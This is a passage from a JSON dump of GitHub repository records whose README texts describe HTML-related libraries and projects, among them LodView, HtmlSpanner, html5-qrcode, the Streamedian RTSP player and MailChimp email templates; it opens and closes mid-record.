`http:\/\/example.com\/page\/aaaa`) or set a full \"Pubby compliant\" redirection strategy (e.g. `http:\/\/example.com\/page\/aaaa`, `http:\/\/example.com\/data\/aaaa.ntriples`, etc.) to easily update to LodView but still offering the same URLs to the users.\n\n##### Internationalization and content language\nAvailable languages: English, Italian, French, Slovak, Galician and Dutch.\n\nLodView interface uses a very few words (labels and system messages) all managed with a language configuration file. It's able to use the client locale to manage not only the interface language but also the RDF literal values for a full i18n experience. You also have the possibility to override your default locale using 'locale' parameter, e.g. `http:\/\/example.com?locale=fr`.\n\nWe will appreciate any help in translating LodView, please commit your translation using GitHub or send us the [translation file](https:\/\/github.com\/dvcama\/LodView\/blob\/master\/src\/main\/resources\/messages_en.properties).\n\nSpecial thanks to Jana Ivanov\u00e1 for the Slovak translation, to Miguel Solla for the Galician translation and to Roland Cornelissen for the Dutch translation.\n\n##### Information about used properties\nLodView provides info about every property found in the resource, just hover on the property to get an \"info tooltip\" that shows label and comment from the referring ontology (according to the locale of the client). See also [how to populate info tooltip](https:\/\/github.com\/dvcama\/LodView\/wiki\/how-to%3A-populate-info-tooltip).\n\n##### Object properties\nIn order to help humans understand the meaning of a resource, LodView shows the label of every object property it has found according to the locale of the client.\n\n##### Blank nodes management\nWe don't like blank nodes, but they are used sometimes so we have managed them as an actual part of the resource; they contain information that doesn't belong to any other resource so LodView shows them in the main resource page nesting their values in sub-boxes which saves the user further clicks and contextualizes data more effectively.\n\n##### Inverse relations management\nInverse relations are an interesting descriptive part of a resource. Very often inverse relations are as valuable and informative as direct relations, and sometimes there are too many of them to be shown all in one go on the HTML page. LodView collects the inverse resources showing them in collapsed boxes; it also provides information about the used inverse properties and the total count of elements that share them without transferring all the data at once but using light on-demand Ajax calls instead.\n\n##### Colors and user experience\nLodView is beautiful and colorful: you can let it randomize the colors of the interface or set your own colors or even bind classes to specific colors to make all \"people\" orange and all \"organizations\" green.\n\n##### Resource widget\nLodView provides (and will provide) various widgets for displaying multimedia contents, thesaurus hierarchies, external connected resources and geographical information.\n\n##### Image widget\nEasy access to the image referenced in a resource, e.g. [British museum](http:\/\/lodview.it\/lodview\/?IRI=http%3A%2F%2Fcollection.britishmuseum.org%2Fid%2Fobject%2FYCA62958&sparql=http%3A%2F%2Fcollection.britishmuseum.org%2Fsparql&prefix=http%3A%2F%2Fcollection.britishmuseum.org%2Fid%2Fobject%2F).\n\n##### Video and audio widget\nPlayers for videos and even audio files are embedded in the resource page, e.g. [linked jazz](http:\/\/lodview.it\/lodview\/?IRI=http%3A%2F%2Flinkedjazz.org%2Fresource%2FMary_Lou_Williams&sparql=https%3A%2F%2Flinkedjazz.org%2Fsparql%2Fselect&prefix=http%3A%2F%2Flinkedjazz.org%2Fresource%2F).\n\n##### Linked LOD resources widget\nTo make the context of the viewed resourced even more understandable and to prove the power of the linked data cloud, all connected resources (e.g. `sameAs`) are automatically shown with their title, an image or a map, and an abstract, e.g. [dati.camera](http:\/\/lodview.it\/lodview\/?IRI=http%3A%2F%2Fdati.camera.it%2Focd%2Fpersona.rdf%2Fp4230&sparql=http%3A%2F%2Fdati.camera.it%2Fsparql&prefix=http%3A%2F%2Fdati.camera.it%2Focd%2F).\n\n##### Map representation widget\nGeographical information is shown as points on a map (thanks to the OSM project), e.g. [geonames](http:\/\/lodview.it\/lodview\/?IRI=http%3A%2F%2Fsws.geonames.org%2F6471849%2F&sparql=%3C%3E&prefix=http%3A%2F%2Fsws.geonames.org%2F).\n\n**TODO**: manage shape representation.\n\n##### Hierarchy widget\n**TODO**: develop a widget which is able to represent hierarchical relations (e.g. thesauri, family trees or taxonomies).\n\n##### SPARQL URL handler\nBecause we want the SPARQL endpoint URL to be easy to deduce from a resource's IRI, LodView manages calls to `http:\/\/data.yourdomain.com\/sparql` redirecting clients to the SPARQL endpoint real URL or proxying it for an even easier access (proxy feature is still under development). This particular feature simplifies server configuration and supports client's discovery capabilities.\n\n##### LodLive integration\n\n**TODO**: We want to integrate LodLive in the interface to avoid LodLive having to be open in a new page. The integration will provide an easy graph navigation model, very useful to better understand resource context and to move on to other resources without using standard hyperlinks.\n\n* * *\ncontact information: info@lodlive.it\n"},{"repo":"\/NightWhistler\/HtmlSpanner","language":"Java","readme_contents":"# Android HTML rendering library\n\nHtmlSpanner started as the HTML rendering library for PageTurner, but looking through some questions on StackOverflow I noticed how many people were struggling with the infamous ``Html.fromHtml()`` and getting its results to display properly in TextViews.\n\nHtmlSpanner allows you full control over how tags are rendered and gives you all the data about the location of a tag in the text. This allows proper handling of anchors, tables, numbered lists and unordered lists.\n\nThe default link implementation just opens URLs, but it can be easily overridden to support anchors.\n\nHtmlSpanner uses HtmlCleaner to do most of the heavy lifting for parsing HTML files.\n\n# CSS support\n\nHtmlSpanner now also supports the most common subset of CSS: both style tags and style attributes are parsed by default, and the style of all built-in tags can be updated.\n\n# Supported Tags\n\n* i\n* em\n* cite\n* dfn\n* b\n* strong\n* blockquote\n* ul\n* ol\n* tt\n* code\n* style\n* br\n* p\n* div\n* h1\n* h2\n* h3\n* h4\n* h5\n* h6\n* pre\n* big\n* small\n* sub\n* sup\n* center\n* li\n* a\n* img\n* font\n* span\n\n# Supported Style Attributes\n\n* font-family\n* text-alignment\n* font-size\n* font-weight\n* font-style\n* color\n* background-color\n* display\n* margin-top\n* margin-bottom\n* margin-left\n* margin-right\n* text-indent\n* border-style\n* border-color\n* border-style\n\n# Usage\nIn its simplest form, just call ``(new HtmlSpanner()).fromHtml()`` to get similar output as Android's ``Html.fromHtml()``.\n\n# HTMLCleaner Source\nsee http:\/\/htmlcleaner.sourceforge.net\/index.php\n\nThe fork under https:\/\/github.com\/amplafi\/htmlcleaner can not be used on Android <= 2.1 as it uses java.lang.String.isEmpty\n\n"},{"repo":"\/codeschool-projects\/HTMLPortfolioProject","language":"JavaScript","readme_contents":"# HTML Portfolio\n\nYou'll create a personal web page to show off your work. We will test your HTML knowledge, and then it will be up to you to use CSS to style your own page and make it unique.\n\n## What You'll Build\n\nThe end result will be a portfolio that you can deploy publicly! Here's a sample of what this could look like:\n\n![Sample Portfolio](http:\/\/courseware.codeschool.com.s3.amazonaws.com\/projects\/build-a-portfolio-using-html-and-css.png)\n\n## What You'll Learn\n\nWe'll dive into a number of basic HTML concepts, including:\n\n* Creating an HTML page\n* Using classes to organize your page and tie in styles\n* Using headings to denote importance\n* Adding text using paragraphs\n* Creating links so users can contact you\n\n## What You'll Need\n\nYou'll need a GitHub account, Git installed locally, and a text editor to edit HTML. We recommend using GitHub's [Atom Editor](https:\/\/atom.io\/), which is free and very powerful. The [Brackets](http:\/\/brackets.io\/) editor is another great tool.\n\n## Live Demo\n\nHere is a [working version of this project](https:\/\/codeschool-project-demos.github.io\/HTMLPortfolioProject\/), and now it is your job to out-do our version of this project by customizing your portfolio even further and adding more CSS rules, etc. We can't wait to see what you come up with!\n\n## Setup\n\nOnce you have cloned the forked repository, go into the directory containing the project and look for the `\/src` directory. This is the directory where you will be making changes when you start following the step-by-step instructions. You can simply open those files in a text editor and get started.\n\nYou can always open the index.html file directly in your browser and work through the tasks below. You can also head over to the [Node.js](https:\/\/nodejs.org) website and follow the instructions to install Node on your machine. Once you have Node installed, open your command line and follow these instructions:\n\n```\ncd HTMLPortfolioProject\nnpm install\nnpm start\n```\n\nRunning `npm start` should open a browser window pointing to `http:\/\/localhost:3000`. Now once you make changes to the files under the `\/src` directory, your browser will refresh automatically, displaying the newest changes made to the files. This will save you the round trip of saving files and clicking refresh on your browser.\n\n## Tasks\n\nComplete the following tasks to finish this project.\n\n\n### Create the Page Header\n\nAt the top of our page, we'll want to create an element with a class of `header` for us to add some information about ourselves.\tMENU\n\n### Header Text\n\nInside of our `.header` element, create an `h1` tag with your name in it. This is your portfolio, so it makes sense for your name to have the most prominence.\tMENU\n\n### Job Title\n\nAlso inside the `.header` element, add a `h2` tag with a job title (ie. \"software developer\", or \"web designer\", or \"maker of things\", etc).\tMENU\n\n### The Tagline Element\n\nNext, create a new element that has a CSS class called `tagline`. In this element you'll be giving a little more information about yourself.\tMENU\n\n### A Little About You\n\nInside the `.tagline` element, create a `h3` tag inviting the visitor to learn more about you (ie. \"Learn More About Me\", or \"Here's What I Do\", etc). Also add an introductory paragraph with more information about yourself, including what things you're passionate about, programming languages you enjoy writing in, etc.\tMENU\n\n### The Skills Element\n\nNext, we'll create a place to list out our current skills by creating an element with a class of `skills`. In here we'll be listing out what we already know.\tMENU\n\n### Skills Content\n\nInside the `.skills` element, create a `h3` tag inviting the user to learn more about your skills (ie. \"my skills\"). Also add a paragraph tag describing your skills (ie. \"I enjoy writing front-end code with these technologies\").\tMENU\n\n### List of Skills\n\nInside the `.skills` element, create a new `ul` which will be a list of of your skills. In here, add 3 skills you currently possess. `HTML` must be one of these skills.\tMENU\n\n### The Contact Element\n\nThe last section of our page will give people a way to contact us. Create a wrapper element for this area and give it a class of `contact`.\tMENU\n\n### Contact Copy\n\nInside the `.contact` element, create a `h3` tag inviting the user to contact you (ie. \"contact me\", or \"drop me a line\"). Also add a paragraph tag describing how people can contact you.\tMENU\n\n### Contact Link\n\nLastly, we just need a way for people to get in touch with us! In the paragraph you created, add an anchor tag (an `<a>` element) pointing people to a place where they can get more information about you (ie. Twitter, LinkedIn, Github, etc).\n\n\n## Next Steps\n\nNow that we have a working portfolio site, the next (optional) step is to style it. If you want to learn how to style this one with Bootstrap, head over to the [Build a Portfolio Using Bootstrap)(\/projects\/build-a-portfolio-using-twitter-bootstrap) project.\n\nIf you\u2019d rather style it on your own, now\u2019s an excellent chance to add a stylesheet to this project and use those CSS skills!\n\n## Deploying\n\nPutting this site up on GitHub pages is a bit different than some other projects because the code is all in the `\/src` directory. There\u2019s a nifty way to push this directory to a GitHub branch, which allows you to use GitHub pages with it! Try running this Git command for this project:\n\n```\ngit subtree push --prefix src origin gh-pages\n```\n\nThis will push the `src` folder up to GitHub on the `gh-pages` branch. After that, you should be able to open up `http:\/\/username.github.io\/HTMLPortfolioProject`, where `username` is your GitHub username.\n"},{"repo":"\/spring-projects\/spring-test-htmlunit","language":"Java","readme_contents":"= Spring MVC Test HtmlUnit\nRob Winch\n\nThis project has been merged http:\/\/docs.spring.io\/spring\/docs\/4.2.0.BUILD-SNAPSHOT\/spring-framework-reference\/htmlsingle\/#spring-mvc-test-server-htmlunit[into spring-test-4.2.0.RELEASE]. The spring-test-html project is not being maintained separately anymore. Please report issues at https:\/\/jira.spring.io\/browse\/SPR\n"},{"repo":"\/dwa012\/html5-qrcode","language":"JavaScript","readme_contents":"#HTML5 QR Code Reader\n\n\n###Description\n--------------\n\n\nThis is a cross platform jQuery library to create a QRcode reader for HTML5 compatible browser.\n\nThe decoder used for the QRcode reading is from LazarSoft\n[https:\/\/github.com\/LazarSoft\/jsqrcode](https:\/\/github.com\/LazarSoft\/jsqrcode)\n\n###Demo\n----------------------\nSee a demo here [http:\/\/dwa012.github.io\/html5-qrcode\/](http:\/\/dwa012.github.io\/html5-qrcode\/)\n\n\n\n###Usage\n----------------------\nInclude ```html5_qrcode.min.js``` in the ```lib``` directory.\n\nCreate a basic ```<div>``` with a given width and height. \n\nPresently width and height attributes must be set. \n \n```\n <div id=\"reader\" style=\"width:300px;height:250px\">\n <\/div>\n```\n\nThen call the ```html5_qrcode``` function on the ```div```. \n \n```\n $('#reader').html5_qrcode(function(data){\n \t\t \/\/ do something when code is read\n \t},\n \tfunction(error){\n\t\t\/\/show read errors \n\t}, function(videoError){\n\t\t\/\/the video stream could be opened\n\t}\n);\n```\n\nIt takes three callbacks: a ```readSuccess```, ```readError```, and ```videoLoadError```. The readError wil be called quite often, it is really only useful for debugging. \n\n```videoError``` is called if the HTML5 video stream cannot be opened.\n\n\nWhen you're done using the camera, call `$('#reader').html5_qrcode_stop()` to stop scanning for QR codes, close the stream, and relinquish permissions granted by the user.   \n(This will result in the \"camera on\" light on their device turning off)\n\n\n###Development\n----------------------\n\nTo create your own builds, you can use [Grunt](http:\/\/gruntjs.com\/). \nA gruntfile has been set up to create minified versions of `html5-qrcode.js` and `jsqrcode-combined.js`.\nYou will need npm (comes with [node](https:\/\/nodejs.org\/)), and [Grunt](http:\/\/gruntjs.com\/) installed first.  \n\nOnce installed, clone this repo and load the submodules by running: `git submodule init` then `git submodule update`. Then run `npm install` to download the node packages for Grunt.\n\nNow, to build the minified versions just run `grunt` from the project directory in your terminal. If you're doing continuous development, you can run `grunt watch` to continuously watch javascript files in `src\\` and automatically build minified versions when they are modified.\n\n\n###MIT LICENSE\n--------------\n\nCopyright &copy; 2013 Daniel Ward\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and\/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n"},{"repo":"\/plutext\/AndroidDocxToHtml","language":"Java","readme_contents":"\r\nUpdate January 2017: For a modern Android Studio app, using docx4j 3.3.x, please see instead https:\/\/github.com\/plutext\/Docx4j4Android4\r\n\r\nConvert sample.docx to HTML on Android, using docx4j.\r\n\r\nWhen you run it, the app should come up with 2 tabs, one displaying the web page, the other the HTML source.\r\n\r\nThe docx which is converted is the one in res\/raw directory.\r\n\r\nIf you look at AndroidDocxToHtmlActivity.java you'll see that you can choose to have HTML images saved as files on the device, or based64 encoded as a data URI.  The latter makes the HTML source harder to read, but avoids issues writing to the device (cleanup etc), see  http:\/\/dataurl.net\/#about \r\n\r\nTo run this Eclipse project, you'll probably need to increase your heap space in eclipse.ini (symptom is 'you get Unable to execute dex: Java heap space').  \r\n\r\nI used: \r\n-Xms256m\r\n-Xmx4096m\r\n\r\nIn Eclipse, Windows > Preferences > General > Show Heap Status gives you an entry on the bottom row which is useful.\r\n\r\nBecause Android does not support JAXB out of the box, this project contains jars which came from:\r\n\r\n    - https:\/\/github.com\/plutext\/jaxb-2_2_5_1\/tree\/android2\r\n    - https:\/\/github.com\/plutext\/ae-xmlgraphics-commons\r\n    - https:\/\/github.com\/plutext\/ae-awt\r\n    \r\nNote: The set of jars here is the minimal set required for HTML output.  Certain other docx4j features will require additional jars, which are not present in this project.    \r\n"},{"repo":"\/lewagon\/html-css-challenges","language":"CSS","readme_contents":"error: no README"},{"repo":"\/yandex-qatools\/htmlelements-examples","language":"Java","readme_contents":"## HtmlElements Examples\nYou can find some examples in *test* dir of modules: \n\n### HtmlElements Thucydides Example\n[Examples of thucydides + HtmlElements](https:\/\/github.com\/yandex-qatools\/htmlelements-examples\/tree\/master\/htmlelements-thucydides-example\/src\/test\/java\/my\/company\/web)\n\n### HtmlElements JUnit Example\n[Getting Started (RU)](https:\/\/github.com\/yandex-qatools\/htmlelements-examples\/blob\/master\/htmlelements-junit-example\/src\/site\/junit-example.md)\n\n[Examples of simple JUnit + HtmlElements source](https:\/\/github.com\/yandex-qatools\/htmlelements-examples\/blob\/master\/htmlelements-junit-example\/src\/test\/java\/my\/company\/web\/)\n"},{"repo":"\/Dimox\/jQueryFormStyler","language":"CSS","readme_contents":"# jQuery Form Styler <sup>[2.0.2](https:\/\/github.com\/Dimox\/jQueryFormStyler\/blob\/master\/CHANGELOG.md)<\/sup>\r\n\r\njQuery-\u043f\u043b\u0430\u0433\u0438\u043d \u0434\u043b\u044f \u0441\u0442\u0438\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 HTML-\u0444\u043e\u0440\u043c:\r\n\r\n- `<input type=\"checkbox\">`\r\n- `<input type=\"radio\">`\r\n- `<input type=\"file\">`\r\n- `<input type=\"number\">`\r\n- `<select>`\r\n\r\n## \u0421\u0441\u044b\u043b\u043a\u0438\r\n\r\n- [\u0421\u0442\u0440\u0430\u043d\u0438\u0446\u0430 \u0441 \u043f\u0440\u0438\u043c\u0435\u0440\u0430\u043c\u0438](https:\/\/dimox.github.io\/jQueryFormStyler\/demo\/)\r\n- [\u0414\u043e\u043c\u0430\u0448\u043d\u044f\u044f \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430 \u043f\u043b\u0430\u0433\u0438\u043d\u0430](http:\/\/dimox.name\/jquery-form-styler\/)\r\n- [\u041f\u043b\u0430\u0433\u0438\u043d \u0432 CDN jsDelivr](https:\/\/www.jsdelivr.com\/package\/npm\/jquery-form-styler) [![](https:\/\/data.jsdelivr.com\/v1\/package\/npm\/jquery-form-styler\/badge)](https:\/\/www.jsdelivr.com\/package\/npm\/jquery-form-styler)\r\n\r\n## \u041b\u0438\u0446\u0435\u043d\u0437\u0438\u044f\r\n\r\n[MIT](https:\/\/github.com\/Dimox\/jQueryFormStyler\/blob\/master\/MIT-LICENSE.md)"},{"repo":"\/Streamedian\/html5_rtsp_player","language":"JavaScript","readme_contents":"## Overview\n\nStreamedian is a Javascript library which implements RTSP client for watching live streams in your browser\nthat works directly on top of a standard HTML <video> element. \nIt requires support of HTML5 Video with Media Sources Extensions for playback. Also player relies on server-side websocket \nproxy for retransmitting RTSP streams to browser.\n\n![](http:\/\/www.specforge.com\/static\/images\/demo\/software_development_1.jpg)\n      \nIt works by muxing RTP H264 and AAC payload into ISO BMFF (MP4) fragments. \n\nStreamedian is written using ECMAScript 2015 standard.\n\n## Live test stream\n\nDemo is available on http:\/\/streamedian.com\/demo\/free\/\n\nBrowser support (ES5 transpiled version):\n\n* Firefox v.42+\n* Chrome v.23+\n* OSX Safari v.8+\n* MS Edge v.13+\n* Opera v.15+\n* Android browser v.5.0+\n* IE Mobile v.11+\n\nNot supported in iOS Safari and Internet Explorer\n\n## Install\n\nnpm install git:\/\/github.com\/Streamedian\/html5_rtsp_player.git\n\n## Usage\n\n### Browser side\n\nAttach HTML Video with RTSP URL\n```\n<video id=\"test_video\" controls autoplay src=\"rtsp:\/\/your_rtsp_stream\/url\"><\/video>\n\nor\n\n<video id=\"test_video\" controls autoplay>\n    <source src=\"rtsp:\/\/your_rtsp_stream\/url\">\n<\/video>\n```\n\nYou can ignore source by passing data-ignore=\"true\":\n\n```\n<video id=\"test_video\" controls autoplay>\n    <source src=\"natively_supported_video_url\" data-ignore=\"true\">\n    <source src=\"rtsp:\/\/your_rtsp_stream\/url\">\n<\/video>\n```\n\nIf browser can play that source, player will not be initialized for this element. \n\nSetup player in your js:\n\n```\nimport * as streamedian from 'streamedian\/player.js';\n\/\/ import WebsocketTransport from 'wsp\/transport\/websocket';\n\/\/ import RTSPClient from 'wsp\/client\/rtsp\/client';\n\nlet mediaElement = rtsp.attach(document.getElementById('test_video'));\nlet player = new streamedian.WSPlayer(mediaElement, {\n    \/\/ url: `${STREAM_URL}`,      \/\/ overrides mediaElement's sources\n    modules: [\n        {\n            \/\/ client module constructor. Should be subclass or BaseClient. RTSPClient by default\n            \/\/ client: RTSPClient,\n            transport: {\n               \/\/ client module constructor. Should be subclass or BaseTransport. WebsocketTransport by default\n               \/\/ constructor: WebsocketTransport,\n               options: {\n                   \/\/ address of websocket proxy described below. ws${location.protocol=='https:'?'s':''}:\/\/${location.host}\/ws\/ by default\n                   socket: \"ws:\/\/websocket_proxy_address\/ws\",\n                   \/\/ function called player exceptions\n                   errorHandler (e) {\n                       alert(`Failed to start player: ${e.message}`);\n                   },\n                   \/\/ function to get credentials for protected streams\n                   queryCredentials() {\n                       return new Promise((resolve, reject)=>{\n                           let c = prompt('input credentials in format user:password');\n                           if (c) {\n                               this.setCredentials.apply(this, c.split(':'));\n                               resolve();\n                           } else {\n                               reject();\n                           }\n                       });\n                   }\n               }\n           }\n        },\n    ]\n});\n\n```\n\nES6 Modules support is required. You can use rollup to build this script:\n\nrollup.config.js\n```\nimport buble from 'rollup-plugin-buble';\nimport alias from 'rollup-plugin-alias';\n\nconst path = require('path');\n\nexport default {\n    entry: path.join(__dirname, 'example.js'),\n    targets: [\n        {dest: path.join(__dirname, 'example\/streamedian.js'), format: 'es'}\n    ],\n    sourceMap: true,\n    plugins: [\n        \/\/ uncomment if you want to transpile into es5\n        \/\/buble({\n            \/\/exclude: 'node_modules\/**'\n        \/\/}),\n        alias({\n            bp_logger: path.join(__dirname,'node_modules\/bp_logger\/logger'),\n            bp_event: path.join(__dirname,'node_modules\/bp_event\/event'),\n            bp_statemachine: path.join(__dirname,'node_modules\/bp_statemachine\/statemachine'),\n            \/\/jsencrypt: path.join(__dirname,'node_modules\/jsencrypt\/src\/jsencrypt.js'),\n            streamedian: path.join(__dirname,'src')\n        })\n    ]\n\n}\n```\n\n\n```\n> npm install bp_event bp_logger bp_statemachine\n> rollup -c\n```\n\nInclude compiled script into your HTML:\n\n```\n<script src=\"streamedian.js\"><\/script>\n```\n\n### RTSP Authentication\n\nStreamedian player support both basic and digest authentication. Authentication type is detected automatically\nwhen you connect to the stream.\nYou can directly specify user\/password in rtsp url in form rtsp:\/\/username@password:stream.url\/resource\/\nor pass _queryCredentials()_ function to _streamedian.WSPlayer_. This function in order\nshould return promise that call _this.setCredentials(user, password)_.\n\n\n### Server side\n\n1. Install websocket proxy\n\n    Sign up and install websocket proxy from http:\/\/streamedian.com\n\n    Register domain you want to use this player\n\n    Download license file to your server\n\n    Note that this package depends on systemd and gcc5+ runtime so it can be installed \n    only on recent distribution versions. \n\n2. Configure port and license file path in \/etc\/ws_rtsp.ini\n\n    This port should be open in your firewall. Also you can pass request to this port from your proxy. (for example: http:\/\/nginx.org\/en\/docs\/http\/websocket.html) \n\n3. Run it\n\n```\n> service ws_rtsp start\n```\n\n### Player architecture\n\nPlayer comprises three main modules: **transport**, **client** and **remuxer**.  \n\n**Transport** responsible for data delivery and data queuing. It should fire _connected_, _disconnected_ and _data_ events.\nAs soon data received, transport should push it into dataQueue and fire _data_ event. Base class for transports can be found in core\/base_transport.\nAs a default, WebsocketTransport that relies on websocket proxy is implemented.\n \n**Client** listens for data events, parse it into elementary stream packets and enqueue parsed data into it's own queue. Client can \npass queued buffer to remuxer with _samples_ event. To identify stream track client should fire _tracks_ event. When ready, _flush_\nevent can be used to construct media fragment and pass it to video presenter. Base class for transports can be found in core\/base_client.\nDefault client is RTSP client over websocket transport.\n\n**Remuxer** prepares media fragment for video presenter and push it. There is only video presenter at the moment, based on media source extensions.\nRemuxer collects data into mp4 media fragments (moof+mdat) and pass it into source buffer.\n\n### How RTSP proxy works?\n\nRTSP player establish connection with proxy with following protocol:\n\n1. Connect to RTSP channel by connecting websocket with \"rtsp\" protocol specified and get connection id\n\n    ```\n    c>s:\n    WSP\/1.1 INIT\\r\\n\n    seq: <sequence_id for response tracking>\n    host: <RTSP stream host>\\r\\n\n    port: <RTSP stream port>\\r\\n\\r\\n\n       \n    s>c:\n    WSP\/1.1 200 OK\\r\\n\n    seq: <sequence_id for response tracking>\n    channel: <channel_id>\\r\\n\\r\\n\n    \n    Error codes >= 400 means error\n    ```\n\n2. Connect to RTP channel by connecting websocket with \"rtp\" protocol\n\n    ```\n    c>s:\n    WSP\/1.1 JOIN\\r\\n\n    seq: <sequence_id for response tracking>\\r\\n\n    channel: <channel_id achieved from RTSP socket initialization>\\r\\n\\r\\n\n    \n    s>c:\n    WSP\/1.1 200 OK\\r\\n\n    seq: <sequence_id for response tracking>\\r\\n\\r\\n\n    \n    Error codes >= 400 means error\n    ```\n\n3. Send RTSP commands wrapped into WSP protocol: \n\n    ```\n    c>s:\n    WSP\/1.1 WRAP\\r\\n\n    seq: <sequence_id for response tracking>\\r\\n\n    \\r\\n\n    <RTSP_PROTOCOL_DATA>\n    \n    s>c:\n    WSP\/1.1 200 OK\\r\\n\n    channel: <channel_id>\\r\\n\n    \\r\\n\n    <RTSP_PROTOCOL_RESPONSE>\n    \n    Error codes >= 400 means error\n    ```\n\n4. RTP channel should send interleaved data with 4 byte header ($\\<channel\\>\\<size\\>). Separate RTP is not supported at this moment\n\n\n### Load balancing\n\nRTSP proxy does not support load balancing itself but can be easily integrated with such load balancers like nginx.\nYou can start multiple instances of proxy on different sockets and configure nginx upstreams.\n\n![](http:\/\/www.specforge.com\/static\/images\/demo\/ws_rtsp_proxy.png)\n\n\nHave any suggestions to improve our player?\nFeel free to leave comments or ideas streamedian.player@gmail.com\n"},{"repo":"\/raselahmed7\/Quickstart-HTML","language":"CSS","readme_contents":"error: no README"},{"repo":"\/mailchimp\/email-blueprints","language":null,"readme_contents":"Email Blueprints\n================\n\n[Brought to you by MailChimp](http:\/\/www.mailchimp.com\/), these email blueprints are licensed under a [Creative Commons Attribution-ShareAlike 3.0 Unported License](http:\/\/creativecommons.org\/licenses\/by-sa\/3.0\/).\n\nEmail Blueprints is a collection of HTML email templates that can serve as a solid foundation and starting point for the design of emails. They include template language elements that make them customizable when imported into a MailChimp account, as well as merge tags that will generate dynamic content when sent through MailChimp. Not a MailChimp user? You can [sign up free](http:\/\/www.mailchimp.com\/signup) or simply strip out merge tags and use these templates to send through any system.\n\nFor clarification on the coding practices shown in these emails, or for general HTML email knowledge, visit MailChimp's [HTML Email Reference](http:\/\/templates.mailchimp.com).\n\nContents\n--------\n\n**\/modular-template-patterns** contains a single template built out of modular blocks of common design patterns.\n\n**\/responsive-templates** contains a collection of responsive \/ mobile-friendly email templates with various layouts.\n\n**\/templates** contains a collection of fixed-width email templates with various layouts.\n\nResponsive Templates & CSS Inlining\n-----------------------------------\n\nWhen inlining the CSS in the responsive templates, be sure **not** to include the styles within the media query; they should remain in the head element of the email. The MailChimp app and [external CSS inliner](http:\/\/beaker.mailchimp.com\/inline-css) both inline the CSS correctly, but many services may not.\n\n![Bitdeli](https:\/\/d2weczhvl823v0.cloudfront.net\/mailchimp\/Email-Blueprints\/trend.png)\n"},{"repo":"\/zzhoujay\/RichText","language":"Java","readme_contents":"# RichText [ ![Download](https:\/\/api.bintray.com\/packages\/zzhoujay\/maven\/richtext\/images\/download.svg) ](https:\/\/bintray.com\/zzhoujay\/maven\/richtext\/_latestVersion)\n\n> Android\u5e73\u53f0\u4e0b\u7684\u5bcc\u6587\u672c\u89e3\u6790\u5668\n\n* \u6d41\u5f0f\u64cd\u4f5c\n* \u4f4e\u4fb5\u5165\u6027\n* \u4f9d\u8d56\u5c11\uff0c\u53ea\u4f9d\u8d56\u4e86`disklrucache`\u548c`support v4`\n* \u652f\u6301Html\u548cMarkdown\u683c\u5f0f\u6587\u672c\n* \u652f\u6301\u56fe\u7247\u70b9\u51fb\u548c\u957f\u6309\u4e8b\u4ef6\n* \u94fe\u63a5\u70b9\u51fb\u4e8b\u4ef6\u548c\u957f\u6309\u4e8b\u4ef6\n* \u652f\u6301\u8bbe\u7f6e\u52a0\u8f7d\u4e2d\u548c\u52a0\u8f7d\u9519\u8bef\u65f6\u7684\u56fe\u7247\n* \u652f\u6301\u81ea\u5b9a\u4e49\u8d85\u94fe\u63a5\u7684\u70b9\u51fb\u56de\u8c03\n* \u652f\u6301\u4fee\u6b63\u56fe\u7247\u5bbd\u9ad8\n* \u652f\u6301GIF\u56fe\u7247\n* \u652f\u6301Base64\u7f16\u7801\u3001\u672c\u5730\u56fe\u7247\u548cAssets\u76ee\u5f55\u56fe\u7247\n* \u81ea\u6301\u81ea\u5b9a\u4e49\u56fe\u7247\u52a0\u8f7d\u5668\u3001\u56fe\u7247\u52a0\u8f7d\u5668\n* \u652f\u6301\u5185\u5b58\u548c\u78c1\u76d8\u53cc\u7f13\u5b58\n* \u5df2\u7ecf\u52a0\u5165\u5bf9\u81ea\u5b9a\u4e49Html\u89e3\u6790\u5668\u7684\u652f\u6301\n\n### \u6548\u679c\n\n![\u6f14\u793a](image\/image.jpg \"\u6f14\u793a\")\n\n\n### gradle\u4e2d\u5f15\u7528\u7684\u65b9\u6cd5\n\n```\ncompile 'com.zzhoujay.richtext:richtext:latest-version'\n```\n\n### \u4f7f\u7528\u65b0\u7684Html\u89e3\u6790\u5668\n\n\u53ea\u9700\u52a0\u5165\u6b64\u4f9d\u8d56\u5373\u53ef\uff0c\u65e0\u987b\u5176\u4ed6\u64cd\u4f5c\uff0c\u65b0Html\u89e3\u6790\u5668\u5bf9\u539f\u751fHtml\u89e3\u6790\u5668\u7684\u529f\u80fd\u505a\u4e86\u8865\u5145\n```\ncompile 'com.zzhoujay:html:latest-version'\n```\n\n\u65b0Html\u89e3\u6790\u5668\u589e\u52a0\u4e86\u5bf9\u4ee3\u7801\u5757\u7684\u652f\u6301\uff0c\u4ee3\u7801\u5757\u53ef\u4ee5\u89e6\u53d1\u70b9\u51fb\u4e8b\u4ef6\uff0c\u901a\u8fc7`urlClick`\u8bbe\u7f6e\uff0c\n\u4ee3\u7801\u5757\u56de\u8c03\u7684\u53c2\u6570\u7531`code:\/\/`\u5f00\u5934\n\n\u4f7f\u7528\u65b0Html\u89e3\u6790\u5668\u9047\u5230\u95ee\u9898\u8bf7\u5728[https:\/\/github.com\/zzhoujay\/Htm](https:\/\/github.com\/zzhoujay\/Html)\u63d0issue\n\n### 